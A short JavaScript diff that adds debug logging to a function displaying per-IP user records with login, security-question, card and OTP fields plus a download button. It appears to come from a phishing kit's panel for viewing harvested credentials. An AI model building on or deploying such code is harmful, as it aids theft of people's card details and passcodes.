@@ -154,8 +154,9 @@ function formatUserDataForDisplay(userData, ip) {
 
   userData.forEach(([ipAddress, details]) => {
     if (details.ip == ip) {
+      console.log(details.ip)
       if (details.getUserDataLogin || details.getUserDataQuestion || details.getUserDataDetails || details.getUserDataCard || details.getUserDataOTP) {
-
+        console.log(details.getUserDataLogin.username)
          return `   <div class="card">
                <button id="downloadButton" class="btn btn-secondary mt-2">Download</button>
   <div class="card-header">
